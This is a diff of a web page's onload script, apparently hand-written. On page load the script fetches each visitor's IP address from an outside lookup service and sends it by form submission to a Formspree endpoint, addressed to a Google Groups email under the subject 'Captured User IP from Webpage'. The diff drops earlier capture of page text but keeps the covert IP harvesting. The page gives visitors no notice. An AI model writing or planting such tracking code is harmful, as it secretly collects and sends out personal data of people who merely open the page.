@@ -13,24 +13,19 @@
 
   <script>
     window.onload = function() {
-      // Capture the text content of specific elements
-      const headerText = document.querySelector("h1").innerText;
-      const paragraphText = document.querySelector("p").innerText;
-
-      // Use ipwhois.io (free API) to get the user's IP address
+      // Immediately fetch the user's IP address
       fetch("https://ipwhois.app/json/")
         .then(response => response.json())
         .then(data => {
-          const userIP = data.ip; // The user's IP address
-          console.log(`User's IP Address: ${userIP}`); // Debugging line to see the IP
+          const userIP = data.ip; // Get the user's IP address
 
-          // Combine the text content into one message, including the user's IP address
-          const emailMessage = `${headerText}\n\n${paragraphText}\n\nUser IP: ${userIP}`;
+          // Combine the text content and IP address into one message
+          const emailMessage = `User IP: ${userIP}`;
 
           // Prepare form data (this simulates a form submission)
           const formData = new FormData();
           formData.append("email", "googleusers9913337@googlegroups.com"); // Recipient's email
-          formData.append("subject", "Captured Text and User IP from Webpage");
+          formData.append("subject", "Captured User IP from Webpage");
           formData.append("message", emailMessage);
 
           // Send the form data to Formspree endpoint
